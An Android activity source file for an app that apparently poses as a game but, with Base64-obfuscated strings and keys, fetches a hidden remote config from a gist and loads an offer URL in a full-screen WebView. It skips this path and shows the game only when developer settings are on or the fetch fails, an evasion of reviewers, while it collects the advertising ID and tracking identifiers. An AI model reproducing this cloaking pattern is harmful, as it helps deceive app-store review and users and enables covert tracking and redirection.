package com.nneo.srta;


import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.webkit.ValueCallback;
import android.webkit.WebView;
import android.webkit.WebViewClient;


import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Map;
import java.util.Objects;


import android.webkit.WebChromeClient;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;

public class NS extends AppCompatActivity {
    public  WebView webViewNnneoSrta;
    public static final String ONESIGNAL_APP_ID_NNEO_SRTA = "MWNmYmE0NTAtNzYyNC00OGU0LWE4YmQtMzg2N2RjOWEyMmQ5";
    private static final String URL_DEF_NNEO_SRTA = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9SS0RldjExL2ExMGYyZjU3ZWJiZGFhNGQyNTg2MGYzZWMzZjJlOTY5L3Jhdy9OZW9uJTI1MjBTdGFy";
    public static final int FILECHOOSER_RESULTCODE_NNEO_SRTA = 1;
    public static final String AF_DEV_KEY_NNEO_SRTA = "WUU3dVpuY0pDY2hNRnJWdkFicm5KUg==";
    public String linkTrueNnneoSrta;
    public static String BUF_READ_NNEO_SRTA;
    public String[] lineNnneoSrta;
    public ValueCallback<Uri[]> mFilePathCallbackNnneoSrta;
    public String mCameraPhotoPathNnneoSrta;
    public ValueCallback<Uri> mUploadMessageNnneoSrta;
    public Uri mCapturedImageURINnneoSrta = null;
    public static String adIdNnneoSrta;
    public static String apps_idNnneoSrta;
    public String paramsNnneoSrta;
    public String dataFbNnneoSrta;
    public String packageNameNnneoSrta = "Y29tLm5uZW8uc3J0YQ==";
    String savedLinkNnneoSrta;
    SharedPreferences spNnneoSrta;
    public String keyLinkNnneoSrta;
    public String linkOfferNnneoSrta;
    public String fbIdNnneoSrta;
    public static String fbDataNnneoSrta;
    public static Intent intentNnneoSrta;
    public String statusAppsFlyerNnneoSrta = "";



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getWindow().addFlags(1024);
        intentNnneoSrta = new Intent(NS.this, GameActivity.class);
        webViewNnneoSrta = findViewById(R.id.webView);
        int adbNnneoSrta = Settings.Secure.getInt(this.getContentResolver(),
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
        WebClass webClassNnneoSrta = new WebClass();
        ParsLine parsLineNnneoSrta = new ParsLine();

        webClassNnneoSrta.oneSignal(this);

        AppsFlyerLib.getInstance().init(Decoder11(AF_DEV_KEY_NNEO_SRTA), webClassNnneoSrta.conversionListenerNnneoSrta, NS.this);
        AppsFlyerLib.getInstance().start(NS.this);
        apps_idNnneoSrta = AppsFlyerLib.getInstance().getAppsFlyerUID(NS.this);

        if (adbNnneoSrta == 0) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        adIdNnneoSrta = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
                        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(Decoder11(URL_DEF_NNEO_SRTA)).openConnection();
                        BufferedReader bufferedReaderNnneoSrta = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                        BUF_READ_NNEO_SRTA = bufferedReaderNnneoSrta.readLine();

                        lineNnneoSrta = BUF_READ_NNEO_SRTA.split("\\u007c");

                        linkOfferNnneoSrta = lineNnneoSrta[0];

                        keyLinkNnneoSrta = lineNnneoSrta[1];

                        fbIdNnneoSrta = lineNnneoSrta[2];

                        spNnneoSrta = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
                        savedLinkNnneoSrta = spNnneoSrta.getString(Decoder11("a2V5X3VybA=="), null);
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                FacebookSdk.setApplicationId(fbIdNnneoSrta);
                                FacebookSdk.setAdvertiserIDCollectionEnabled(true);
                                FacebookSdk.fullyInitialize();
                                FacebookSdk.setAutoInitEnabled(true);
                                FacebookSdk.setAutoLogAppEventsEnabled(true);
                                AppLinkData.fetchDeferredAppLinkData(NS.this,
                                        new AppLinkData.CompletionHandler() {
                                            @Override
                                            public void onDeferredAppLinkDataFetched(AppLinkData appLinkDataNnneoSrta) {
                                                if (appLinkDataNnneoSrta == null) {
                                                    appLinkDataNnneoSrta = AppLinkData.createFromActivity(NS.this);
                                                }
                                                if (appLinkDataNnneoSrta != null) {
                                                    Uri url = appLinkDataNnneoSrta.getTargetUri();
                                                    dataFbNnneoSrta = url.getQuery();
                                                    fbDataNnneoSrta = parsLineNnneoSrta.ChangeLine(dataFbNnneoSrta);
                                                } else {

                                                }
                                            }
                                        });

                                if (savedLinkNnneoSrta != null) {
                                    webClassNnneoSrta.getWeb(webViewNnneoSrta, savedLinkNnneoSrta);
                                } else {
                                    new Handler().postDelayed(new Runnable() {
                                        @Override
                                        public void run() {
                                            webClassNnneoSrta.StartWebView(linkOfferNnneoSrta, keyLinkNnneoSrta, webViewNnneoSrta, fbDataNnneoSrta, NS.this);
                                        }
                                    },5000);
                                }

                                webViewNnneoSrta.setWebViewClient(new WebViewClient() {
                                    @Override
                                    public void onPageStarted(WebView view, String url, Bitmap favicon) {
                                        super.onPageStarted(view, url, favicon);
                                        if (url.contains(Decoder11("NDA0"))) {
                                            Intent intentNnneoSrta = new Intent(NS.this, GameActivity.class);
                                            startActivity(intentNnneoSrta);
                                        }
                                    }

                                    @Override
                                    public void onPageFinished(WebView view, String url) {
                                        super.onPageFinished(view, url);
                                        SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(view.getContext());
                                        SharedPreferences.Editor editorNnneoSrta = sp.edit();
                                        editorNnneoSrta.putString(Decoder11("a2V5X3VybA=="), url);
                                        editorNnneoSrta.apply();
                                    }

                                });
                                webViewNnneoSrta.setWebChromeClient(new WebChromeClient() {

                                    public boolean onShowFileChooser(
                                            WebView webView, ValueCallback<Uri[]> filePathCallback,
                                            FileChooserParams fileChooserParams) {
                                        if (mFilePathCallbackNnneoSrta != null) {
                                            mFilePathCallbackNnneoSrta.onReceiveValue(null);
                                        }
                                        mFilePathCallbackNnneoSrta = filePathCallback;

                                        Intent takePictureIntentNnneoSrta = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                                        if (takePictureIntentNnneoSrta.resolveActivity(getPackageManager()) != null) {

                                            File photoFileNnneoSrta = null;
                                            try {
                                                photoFileNnneoSrta = createImageFile();
                                                takePictureIntentNnneoSrta.putExtra(Decoder11("UGhvdG9QYXRo"), mCameraPhotoPathNnneoSrta);
                                            } catch (IOException ex) {
                                            }

                                            if (photoFileNnneoSrta != null) {
                                                mCameraPhotoPathNnneoSrta = Decoder11("ZmlsZTo=") + photoFileNnneoSrta.getAbsolutePath();
                                                takePictureIntentNnneoSrta.putExtra(MediaStore.EXTRA_OUTPUT,
                                                        Uri.fromFile(photoFileNnneoSrta));
                                            } else {
                                                takePictureIntentNnneoSrta = null;
                                            }
                                        }
                                        Intent contentSelectionIntentNnneoSrta = new Intent(Intent.ACTION_GET_CONTENT);
                                        contentSelectionIntentNnneoSrta.addCategory(Intent.CATEGORY_OPENABLE);
                                        contentSelectionIntentNnneoSrta.setType(Decoder11("aW1hZ2UvKg=="));

                                        Intent[] intentArrayNnneoSrta;
                                        if (takePictureIntentNnneoSrta != null) {
                                            intentArrayNnneoSrta = new Intent[]{takePictureIntentNnneoSrta};
                                        } else {
                                            intentArrayNnneoSrta = new Intent[0];
                                        }
                                        Intent chooserIntentNnneoSrta = new Intent(Intent.ACTION_CHOOSER);
                                        chooserIntentNnneoSrta.putExtra(Intent.EXTRA_INTENT, contentSelectionIntentNnneoSrta);
                                        chooserIntentNnneoSrta.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_chooser));
                                        chooserIntentNnneoSrta.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArrayNnneoSrta);
                                        startActivityForResult(chooserIntentNnneoSrta, FILECHOOSER_RESULTCODE_NNEO_SRTA);
                                        return true;
                                    }

                                    private File createImageFile() throws IOException {

                                        File imageStorageDirNnneoSrta = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), Decoder11("RGlyZWN0b3J5TmFtZUhlcmU="));

                                        if (!imageStorageDirNnneoSrta.exists()) {
                                            imageStorageDirNnneoSrta.mkdirs();
                                        }
                                        imageStorageDirNnneoSrta = new File(imageStorageDirNnneoSrta + File.separator + Decoder11("SU1HXw==") + String.valueOf(System.currentTimeMillis()) + Decoder11("LmpwZw=="));
                                        return imageStorageDirNnneoSrta;
                                    }
                                });
                            }
                        });
                    } catch (Exception e) {
                        startActivity(intentNnneoSrta);
                    }
                }
            }).start();
        } else {
            startActivity(intentNnneoSrta);
        }
    }

    @Override
    public void onActivityResult(int requestCodeNnneoSrta, int resultCodeNnneoSrta, Intent dataNnneoSrta) {

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            if (requestCodeNnneoSrta == FILECHOOSER_RESULTCODE_NNEO_SRTA) {
                if (null == this.mUploadMessageNnneoSrta) {
                    return;
                }
                Uri result = null;
                try {
                    if (resultCodeNnneoSrta != RESULT_OK) {
                        result = null;
                    } else {
                        result = dataNnneoSrta == null ? mCapturedImageURINnneoSrta : dataNnneoSrta.getData();
                    }
                } catch (Exception e) {
                        Toast.makeText(getApplicationContext(), Decoder11("YWN0aXZpdHkgOg==") + e, Toast.LENGTH_LONG).show();
                }
                mUploadMessageNnneoSrta.onReceiveValue(result);
                mUploadMessageNnneoSrta = null;
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCodeNnneoSrta != FILECHOOSER_RESULTCODE_NNEO_SRTA || mFilePathCallbackNnneoSrta == null) {
                super.onActivityResult(requestCodeNnneoSrta, resultCodeNnneoSrta, dataNnneoSrta);
                return;
            }
            Uri[] results = null;
            if (resultCodeNnneoSrta == Activity.RESULT_OK) {
                if (dataNnneoSrta == null || dataNnneoSrta.getData() == null) {
                    if (mCameraPhotoPathNnneoSrta != null) {
                        results = new Uri[]{Uri.parse(mCameraPhotoPathNnneoSrta)};
                    }
                } else {
                    String dataString = dataNnneoSrta.getDataString();
                    if (dataString != null) {
                        results = new Uri[]{Uri.parse(dataString)};
                    }
                }
            }
            mFilePathCallbackNnneoSrta.onReceiveValue(results);
            mFilePathCallbackNnneoSrta = null;
        }
    }

    public static String Decoder11(String decodNnneoSrta) {
        String decodedString11NnneoSrta = new String(Base64.decode(decodNnneoSrta, Base64.DEFAULT));
        return decodedString11NnneoSrta;
    }

    @Override
    public void onBackPressed() {
        if (webViewNnneoSrta.isFocused() && webViewNnneoSrta.canGoBack()) {
            webViewNnneoSrta.goBack();
        }
    }
}